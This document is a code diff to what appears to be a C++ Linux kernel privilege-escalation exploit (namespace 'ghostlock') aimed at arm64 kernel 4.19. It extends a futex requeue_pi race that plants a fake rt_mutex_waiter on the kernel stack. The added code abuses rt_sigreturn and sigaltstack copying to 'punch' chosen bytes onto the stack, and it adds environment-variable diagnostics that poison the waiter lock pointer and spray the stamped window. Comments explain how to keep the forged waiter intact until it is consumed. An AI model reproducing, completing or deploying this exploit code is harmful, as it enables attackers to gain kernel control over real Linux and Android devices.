@@ -1,4 +1,6 @@
+#include "support/decls.hpp"
 #include <netinet/in.h>
+#include <cstdlib>
 #include <ctime>
 #include <unistd.h>
 
@@ -40,9 +42,22 @@ namespace {
     const unsigned char *g_punch_src = nullptr;
     std::size_t g_punch_len = 0;
     volatile int g_punch_patched = 0;
+    /* __arm64_sys_rt_sigreturn restores uc_stack through restore_altstack(),
+     * which bulk-copies a 24-byte stack_t onto its frame at S-0x2e0.  That is
+     * the only sigreturn copy that reaches below S-0x280 on 4.19, i.e. the only
+     * one able to touch futex_requeue()'s rt_mutex_waiter on this kernel. */
+    volatile std::uint64_t g_altstack_ss_size = 0;
+    volatile int g_altstack_enabled = 0;
 
     void gl_sigret_handler(int, siginfo_t *, void *uctx) {
         auto *uc = static_cast<ucontext_t *>(uctx);
+        if (g_altstack_enabled) {
+            /* SS_DISABLE keeps do_sigaltstack() from rejecting the fake stack
+             * (a kernel pointer is not a valid user stack); the 24 bytes are
+             * copied verbatim before that check runs. */
+            uc->uc_stack.ss_flags = SS_DISABLE;
+            uc->uc_stack.ss_size = static_cast<size_t>(g_altstack_ss_size);
+        }
         auto *res = reinterpret_cast<unsigned char *>(uc->uc_mcontext.__reserved);
         const std::uint32_t zero = 0;
         for (int off = 0; off + 16 <= 4096;) {
@@ -80,9 +95,24 @@ namespace {
         g_punch_src = buf;
         g_punch_len = len;
         g_punch_patched = 0;
+        if (const char *alt = getenv("GL_ALTSTACK_LOCK")) {
+            g_altstack_ss_size = strtoull(alt, nullptr, 16);
+            g_altstack_enabled = 1;
+            pr_warning("diagnostic: altstack ss_size <- 0x%llx\n",
+                       (unsigned long long) g_altstack_ss_size);
+        } else {
+            g_altstack_enabled = 0;
+        }
         pr_info("sigret punch: raise(SIGUSR1) payload=%zu waiter_off=0x%zx\n", len,
                 (std::size_t) 0xe8);
+        support::progress_marker("punch_in");
         raise(SIGUSR1);
+        /* NOTHING may run between the sigreturn copy and the consumer's
+         * sched_setattr(): the punch lands on THIS thread's kernel stack at
+         * depth 0x198 and any later syscall on this thread (even a single
+         * write() to the progress file) unwinds through the same region and
+         * overwrites the fake waiter.  A previous build marked here and the
+         * chain silently degraded to rt_mutex_waiter_equal() -> out. */
         return g_punch_patched == 1;
     }
 } // namespace
@@ -91,6 +121,14 @@ namespace {
 #endif
 
 namespace ghostlock::route {
+    /* Pre-arm punch: the waiter thread must stamp its own do_futex frame
+     * BEFORE it parks, because futex_wait_requeue_pi() only initialises
+     * rt_waiter.task and leaves pi_tree_entry untouched -- that is the one
+     * field a later rt_mutex_dequeue_pi() will rb_erase(). */
+    bool punch_stack_here(const unsigned char *buf, std::size_t len) {
+        return gl_sigret_punch(buf, len);
+    }
+
     route::RouteStatus do_kernel5_fake_lock_route(const memory::WriteRequest *request) {
         (void) request;
         route::RouteStatus status = {.code = ROUTE_RETRYABLE};
@@ -131,6 +169,17 @@ namespace ghostlock::route {
         uint16_t family = AF_UNSPEC;
         memcpy(stamp + 8, &family, sizeof(family));
 
+        /* Diagnostic: GL_POISON_WAITER_LOCK replaces the fake lock pointer with a
+         * non-canonical address.  rt_mutex_adjust_prio_chain() dereferences
+         * waiter->lock (raw_spin_trylock) before any other use, so a panic here
+         * proves the chain is consuming the punched waiter; survival proves
+         * task->pi_blocked_on no longer points at the punched stack slot. */
+        uintptr_t lock_value = session::g_exploit_session.heap.current.fake_lock;
+        if (getenv("GL_POISON_WAITER_LOCK")) {
+            lock_value = 0xdead000000000000ULL;
+            pr_warning("diagnostic: waiter->lock poisoned -> chain probe\n");
+        }
+
         /* One punch is one lottery ticket: the guest copy races skb page
          * recycling, so a single draw misses often. Profiles that do not set
          * these knobs keep the historical one-shot behaviour (attempts=1). */
@@ -155,10 +204,22 @@ namespace ghostlock::route {
                 {reinterpret_cast<std::byte *>(stamp), stamp_size},
                 static_cast<size_t>(*layout.waiter_offset), *layout.task_offset,
                 *layout.lock_offset,
-                (session::g_exploit_session.heap.current.fake_task), (session::g_exploit_session.heap.current.fake_lock))) {
+                (session::g_exploit_session.heap.current.fake_task), lock_value)) {
                 break;
             }
             memcpy(stamp + 8, &family, sizeof(family));
+
+            /* Diagnostic: fill the whole stamped window with a non-canonical
+             * pointer.  Wherever task->pi_blocked_on points inside the punched
+             * stack range, waiter->lock resolves to this value and the chain
+             * faults in raw_spin_trylock(); survival means the stale pointer
+             * does not alias this thread's futex frame at all. */
+            if (getenv("GL_SPRAY_STAMP")) {
+                for (size_t q = 0; q + 8 <= stamp_size; q += 8) {
+                    const uint64_t trap = 0xdead000000000000ULL;
+                    memcpy(stamp + q, &trap, sizeof(trap));
+                }
+            }
 
             session::g_exploit_session.race.consumer_calls.store(0);
             session::g_exploit_session.race.consumer_success.store(0);
@@ -221,6 +282,10 @@ namespace ghostlock::route {
                     __asm__ volatile ("yield" ::: "memory");
             }
         }
+        /* Printed after the last draw only: a syscall earlier in the loop would
+         * unwind through the punched stack slot and erase the fake waiter. */
+        pr_info("punch summary: last_result=%d won=%d/%u patched=%d\n",
+                stamp_result, won_seq, attempts, g_punch_patched);
         status.userspace_clean = 1;
         status.kernel_disarmed = 1;
         if (won_seq > 0) {
